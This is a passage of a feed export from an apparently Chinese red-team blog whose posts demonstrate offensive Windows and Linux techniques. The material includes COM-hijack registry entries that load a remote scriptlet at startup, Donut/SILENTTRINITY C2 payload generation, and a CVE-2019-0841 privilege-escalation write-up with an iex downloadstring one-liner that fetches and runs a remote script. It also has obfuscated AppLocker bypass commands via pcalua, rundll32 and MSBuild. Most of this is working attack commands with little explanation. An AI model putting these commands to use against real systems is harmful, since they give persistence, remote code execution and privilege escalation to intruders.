        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181017_121520.jpg" alt="enter description here"></p><span id="more"></span><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F8C65C239CD6D13EBF6E936E8ECF7297.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6B932C450A5633C53CCB205BF5C5E66D.jpg" alt="enter description here"></p><p><a href="https://twitter.com/harr0ey/status/1052405330402074624">https://twitter.com/harr0ey/status/1052405330402074624</a><br><a href="https://gist.github.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae">https://gist.github.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\setup]</span></span><br><span class="line">@=<span class="string">&quot;rundll32 xwizards.dll,RunPropertySheet /u &#123;00000001-0000-0000-0000-0000FEEDACDC&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;COM Hijacking&quot;</span>=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary]</span></span><br><span class="line">@=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary\CLSID]</span></span><br><span class="line">@=<span class="string">&quot;&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;]</span></span><br><span class="line">@=<span class="string">&quot;Scripting.Dictionary&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\InprocServer32]</span></span><br><span class="line">@=<span class="string">&quot;C:\\WINDOWS\\system32\\scrobj.dll&quot;</span></span><br><span class="line"><span class="string">&quot;ThreadingModel&quot;</span>=<span class="string">&quot;Apartment&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\ProgID]</span></span><br><span class="line">@=<span class="string">&quot;Scripting.Dictionary&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\ScriptletURL]</span></span><br><span class="line">@=<span class="string">&quot;https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\VersionIndependentProgID]</span></span><br><span class="line">@=<span class="string">&quot;Scripting.Dictionary&quot;</span></span><br></pre></td></tr></table></figure><h2 id="2-prmcnfg-vbs"><a href="#2-prmcnfg-vbs" class="headerlink" title="2 prmcnfg.vbs"></a>2 prmcnfg.vbs</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\prncnfg<span class="selector-class">.vbs</span> /?</span><br><span class="line">cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\prncnfg<span class="selector-class">.vbs</span> /?    </span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D8lfnlKUIAYsPBB.jpg" alt="enter description here"></p><p><a href="https://twitter.com/harr0ey/status/1137443710197817344">https://twitter.com/harr0ey/status/1137443710197817344</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Salsa-tools</title>
      <link href="/Salsa-tools.html"/>
      <url>/Salsa-tools.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/594C87D5728DB6A42D0A7398DC6AEE66.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/salsa-tools.mp4'    frameborder="0"     allowfullscreen></iframe><p>感谢WGBIII编译的dll文件<br><a href="https://github.com/Hackplayers/Salsa-tools">https://github.com/Hackplayers/Salsa-tools</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/C5F144C7-3202-4D25-A2BA-D427879AD9CE.png" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>comhijack&amp;meterpreter</title>
      <link href="/comhijack&amp;meterpreter.html"/>
      <url>/comhijack&amp;meterpreter.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/comhijack.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3FF3ECB3EB2FC4EE3BCD10E8CEA98832.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/5F86D7C50E44008A19ECC7A018C27C96.jpg" alt="enter description here"></p><p><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/">https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/</a><br>感谢 WBG的改良使得脚本更加完善</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>donut</title>
      <link href="/donut.html"/>
      <url>/donut.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190513_190748.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/donut.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<p><a href="https://thewover.github.io/Introducing-Donut/">https://thewover.github.io/Introducing-Donut/</a><br><a href="https://github.com/TheWover/donut/">https://github.com/TheWover/donut/</a><br><a href="https://github.com/TheWover/donut/releases/tag/v0.9">https://github.com/TheWover/donut/releases/tag/v0.9</a><br><a href="https://github.com/byt3bl33d3r/SILENTTRINITY">https://github.com/byt3bl33d3r/SILENTTRINITY</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> .\donut<span class="selector-class">.exe</span> -<span class="selector-tag">a</span> <span class="number">1</span> -f .\SILENTTRINITY_DLL<span class="selector-class">.dll</span> -c ST -m Main -<span class="selector-tag">p</span> http:<span class="comment">//192.168.10.125:80</span></span><br><span class="line"> .\donut<span class="selector-class">.exe</span> -<span class="selector-tag">a</span> <span class="number">2</span> -f .\SILENTTRINITY_DLL<span class="selector-class">.dll</span> -c ST -m Main -<span class="selector-tag">p</span> http:<span class="comment">//192.168.10.125:80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&quot;C:\Users\demon\Desktop\payload.bin&quot;</span></span><br><span class="line"><span class="selector-attr">[convert]</span>::<span class="built_in">ToBase64String</span>(<span class="selector-attr">[IO.File]</span>::<span class="built_in">ReadAllBytes</span>(<span class="variable">$filename</span>)) | <span class="attribute">clip</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/67C730933F6BBBF12572A4E54BE29EC5.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1E2238E15A7540C565774F279974CEAC.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/C86DC2516ABBF56F8D18036A1B438515.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AVIator</title>
      <link href="/AVIator.html"/>
      <url>/AVIator.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/AVIator.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/Ch0pin/AVIator">https://github.com/Ch0pin/AVIator</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wikipedia-c2</title>
      <link href="/wikipedia-c2.html"/>
      <url>/wikipedia-c2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190414_232230.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/wikipedia-c2.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/dweezy-netsec/wikipedia-c2">https://github.com/dweezy-netsec/wikipedia-c2</a><br><a href="https://dweezy-netsec.github.io/blog/wikipediac2/">https://dweezy-netsec.github.io/blog/wikipediac2/</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2D53BA3275211C9FD9C5EA76468CDDC6.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sudo_inject</title>
      <link href="/sudo-inject.html"/>
      <url>/sudo-inject.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190414_073022.jpg" alt="enter description here"></p><span id="more"></span><p><a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></p><h2 id="1-执行作者的exp"><a href="#1-执行作者的exp" class="headerlink" title="1.执行作者的exp"></a>1.执行作者的exp</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555198998849.jpg" alt="enter description here"></p><h2 id="2-观察sudo的结构体"><a href="#2-观察sudo的结构体" class="headerlink" title="2.观察sudo的结构体"></a>2.观察sudo的结构体</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200616310.jpg" alt="enter description here"></p><p>1.sudo ls等于获取权限<br>2.sudo id 可以看到sudo等于获取root权限<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200312715.jpg" alt="enter description here"><br>3.sudo -i 等于获取root权限并以root权限使用shell登录</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200580261.jpg" alt="enter description here"></p><p>4.作者在以上基础增加修改 进行sudo注入<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200349172.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200906444.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8F38B224551D2A7C519AEC2328D365F0.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Merlin</title>
      <link href="/merlin.html"/>
      <url>/merlin.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0EBBC533E071635742CC4ABA76DAEA75.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/merlin.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3E558E905B40769BE910FFD6421DD5AA.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/AE2A2E613179B47DAC33CDEA738A1265.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/959E6CAEAF583385A4E9D2A13B6A4EBE.jpg" alt="enter description here"><br>相关链接：<a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a><br><a href="https://posts.specterops.io/merlin-v0-7-0-release-roll-up-717739cde77a">https://posts.specterops.io/merlin-v0-7-0-release-roll-up-717739cde77a</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DACL权限覆盖提权(CVE-2019-0841)</title>
      <link href="/CVE-2019-084.html"/>
      <url>/CVE-2019-084.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/CVE-2019-0841.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<h2 id="1-背景CVE-2019-0841"><a href="#1-背景CVE-2019-0841" class="headerlink" title="1.背景CVE-2019-0841"></a>1.背景CVE-2019-0841</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554975988336.jpg" alt="enter description here"></p><h2 id="2-硬链接"><a href="#2-硬链接" class="headerlink" title="2.硬链接"></a>2.硬链接</h2><p>我们首先看下什么是硬链接。<br><a href="https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/">https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/</a><br>1.首先我们使用作者提到的谷歌项目中的CreateHardlink.exe 创建硬链接<br>2.我们创建两个文本文件 一个(src.txt)源文件 一个(target.txt)目标文件。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976232642.jpg" alt="enter description here"></p><p>3.检查两份文本文档 HASH值。我们并且可以看到两者HASH值相同。.<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976406874.jpg" alt="enter description here"></p><p>4.改变target.txt文本文档 HASH值，随即写入该txt文字。并检查两者HASH值。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976548397.jpg" alt="enter description here" title="可以看到两者HASH值已变化"></p><p>5.那么我们开始创建硬链接<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976657156.jpg" alt="enter description here" title="我们可以看到两者HASH 随着target的hash变化而变化"></p><p>6.我们可以看到两者HASH 随着target的hash变化而变化，并在任意两者txt文件中随即写入文字都内容相同。</p><h2 id="3-分析作者博文中的内容"><a href="#3-分析作者博文中的内容" class="headerlink" title="3.分析作者博文中的内容."></a>3.分析作者博文中的内容.</h2><p>1.首先事出因Windows AppX中 setting.dat文件 由硬链接处理不当导致的权限覆盖。并由于该文件由NT AUTHORITY\SYSTEM将使用该文件，并且作为低权限用户，您可以完全访问该文件。</p><p>2 settings.dat 存储位置 C:\Users&lt;username&gt;\AppData\Local\Packages&lt;Packagename&gt;.<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977003403.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977112874.jpg" alt="enter description here" title="可以看到权限为system"></p><p>3.如果settings.dat 文件损坏，则删除该文件，并由“C:\Windows\System32\settings.dat”，复制到该目录重置。并重启该应用则可重置。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977219647.jpg" alt="enter description here"></p><p>4 最后作者利用自己写的漏洞进行复现<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978682616.jpg" alt="enter description here"></p><ol start="5"><li>过程</li></ol><p>  <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978752002.jpg" alt="enter description here"><br>   1.检查要是用setting.dat的应用是否启用，如果是将其结束，因该应用开始则创建不了硬链接<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978935388.jpg" alt="enter description here"></p><p>  2.检查目标文件是否有低权限，如果有则可创建。<br>  <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979069769.jpg" alt="enter description here"></p><p>  3.创建硬链接<br>   1.未结束该使用的应用 setting.dat  (MicrosoftEdge)<br>   2.已结束该使用的应用 setting.dat  MicrosoftEdge)<br>   3.创建完硬链接后，检查权限未发生变化<br>  <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979252964.jpg" alt="enter description here"></p><p> 4.修复权限，启动应用(MicrosoftEdge)<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979575137.jpg" alt="enter description here"></p><h2 id="4-拓展-powershell"><a href="#4-拓展-powershell" class="headerlink" title="4.拓展(powershell)"></a>4.拓展(powershell)</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D3xwjxYWsAM8Tca.jpg" alt="enter description here"></p><p><a href="https://twitter.com/rogue_kdc/status/1115664188821639173">https://twitter.com/rogue_kdc/status/1115664188821639173</a><br>已向原作者和其他开发者提出该拓展<br><a href="https://pastebin.com/jXaz8xMx">https://pastebin.com/jXaz8xMx</a><br><a href="https://gist.github.com/xillwillx/0377cb2284fa82edb4d2975bab585c45">https://gist.github.com/xillwillx/0377cb2284fa82edb4d2975bab585c45</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979806898.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iex (New-Object net.webclient)<span class="selector-class">.downloadstring</span>(<span class="string">&#x27;https://github.com/FuzzySecurity/PowerShell-Sui</span></span><br><span class="line"><span class="string">te/raw/master/Native-HardLink.ps1&#x27;</span>);</span><br><span class="line">start microsoft-edge:;get-process -name MicrosoftEdge | Stop-process;sleep <span class="number">2</span>;Native-HardLink -</span><br><span class="line">Link c:\users\username\appdata\local\packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\settings\settings<span class="selector-class">.dat</span> -target c:\windows</span><br><span class="line">\system32\drivers\etc\hosts;start microsoft-edge:;get-process -name Microsoftedge | stop-process</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex (New-Object net.webclient)<span class="selector-class">.downloadstring</span>(<span class="string">&#x27;https://github.com/FuzzySecurity/PowerShell-Suite/raw/master/Native-HardLink.ps1&#x27;</span>);start microsoft-edge:;get-process -name MicrosoftEdge | Stop-process;sleep <span class="number">2</span>;Native-HardLink -Link <span class="string">&quot;$env:localappdata\packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\settings\settings.dat&quot;</span> -target <span class="string">&quot;$env:windir\system32\drivers\etc\hosts&quot;</span>;start microsoft-edge:;get-process -name Microsoftedge | stop-process</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0841">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0841</a><br><a href="https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/">https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/</a><br><a href="https://pastebin.com/jXaz8xMx">https://pastebin.com/jXaz8xMx</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AppLockerList</title>
      <link href="/appLockerList1.html"/>
      <url>/appLockerList1.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-pcalua-exe"><a href="#1-pcalua-exe" class="headerlink" title="1.pcalua.exe:&gt;"></a>1.pcalua.exe:&gt;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p^c^a^l^u^a^ ^-^n^ ^-^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a</span><br><span class="line">^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a</span><br><span class="line">^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a</span><br><span class="line">^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a</span><br><span class="line">^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a</span><br><span class="line">^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a</span><br><span class="line">^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a</span><br><span class="line">^a^a^a^a^a^a^a^a^^a^a^a^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^</span><br><span class="line">n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^n^a^n^a</span><br><span class="line">^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n</span><br><span class="line">^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a</span><br><span class="line">^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n</span><br><span class="line">^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n notepad.exe</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1520684757640.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/Cache_1b2d7021fd334132..jpg" alt="enter description here"><br>&nbsp;</p><h2 id="2-Language-LUA-in-Files-wlua"><a href="#2-Language-LUA-in-Files-wlua" class="headerlink" title="2.Language LUA in Files .wlua:&gt;"></a>2.Language LUA in Files .wlua:&gt;</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/Cache_-142521484f69bba1..jpg" alt="enter description here"><br>&nbsp;</p><h2 id="3-INF-SCT"><a href="#3-INF-SCT" class="headerlink" title="3.INF-SCT"></a>3.INF-SCT</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> advpack<span class="selector-class">.dll</span>,LaunchINFSection  c:\test<span class="selector-class">.inf</span>,DefaultInstall_SingleUser,<span class="number">1</span>,</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1520695246464.jpg" alt="enter description here"></p><p><a href="https://twitter.com/bohops/status/967486047839014913">https://twitter.com/bohops/status/967486047839014913</a></p><p><a href="https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf">https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf</a></p><p><a href="https://github.com/homjxi0e/AppLockerBPG">https://github.com/homjxi0e/AppLockerBPG</a><br>&nbsp;</p><h2 id="4-MSBuild-exe"><a href="#4-MSBuild-exe" class="headerlink" title="4.MSBuild.exe"></a>4.MSBuild.exe</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B18E7C8A823838321225F2D38477D618.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1DAE31B177A02BDC202AD0FE2C5D9298.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Local Invocation</span><br><span class="line">================</span><br><span class="line"><span class="selector-attr">[Reflection.Assembly]</span>::<span class="built_in">LoadWithPartialName</span>(<span class="string">&#x27;Microsoft.Build&#x27;</span>);</span><br><span class="line"><span class="variable">$proj</span> = <span class="string">&quot;c:\test\test.csproj&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>=new-<span class="selector-tag">object</span> Microsoft<span class="selector-class">.Build</span><span class="selector-class">.Evaluation</span><span class="selector-class">.Project</span>(<span class="variable">$proj</span>);</span><br><span class="line"><span class="variable">$e</span><span class="selector-class">.Build</span>();</span><br><span class="line">or</span><br><span class="line">Add-Type -Path <span class="string">&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.dll&quot;</span></span><br><span class="line"><span class="variable">$proj</span> = <span class="string">&quot;c:\test\test.csproj&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>=new-<span class="selector-tag">object</span> Microsoft<span class="selector-class">.Build</span><span class="selector-class">.Evaluation</span><span class="selector-class">.Project</span>(<span class="variable">$proj</span>);</span><br><span class="line"><span class="variable">$e</span><span class="selector-class">.Build</span>();</span><br><span class="line">Remote Invocation</span><br><span class="line">=================</span><br><span class="line"><span 